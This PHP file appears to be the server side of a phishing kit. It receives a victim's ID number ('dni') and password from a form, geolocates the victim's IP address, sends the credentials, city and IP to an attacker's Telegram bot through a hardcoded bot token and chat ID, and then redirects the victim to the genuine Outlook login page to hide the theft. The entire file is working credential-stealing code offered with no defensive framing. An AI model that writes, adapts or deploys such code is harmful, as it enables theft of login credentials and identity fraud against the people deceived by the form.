<?php
$token = '5905446592:AAFPBz32wUZ-4DmdAWtqe48XXrQSF4HObBQ';
$website = 'https://api.telegram.org/bot'.$token;
$chat_id = "5063383507";

if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
    $dni = $_POST['dni'];
    $cpass = $_POST['cpass'];

    $ip = $_SERVER["REMOTE_ADDR"];

    // Obtener información de la dirección IP del usuario
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $ip_data_in = curl_exec($ch);
    curl_close($ch);
    $ip_data = json_decode($ip_data_in, true);

    // Verificar si la clave 'city' existe en el array
    if (isset($ip_data["city"])) {
        $city = $ip_data["city"];
    } else {
        $city = "Ciudad Desconocida";
    }

    // Crear el mensaje a enviar a Telegram
    $msg = "User & Password\nDni: $dni\nPassword: $cpass\nCity: $city\nIP: $ip";

    // Enviar el mensaje a Telegram
    $url = $website.'/sendMessage?chat_id='.$chat_id.'&text='.urlencode($msg);
    file_get_contents($url);

    // Redirigir al usuario a una página específica (por ejemplo, Outlook)
    header("Location: https://outlook.live.com/owa/");
    exit;
}
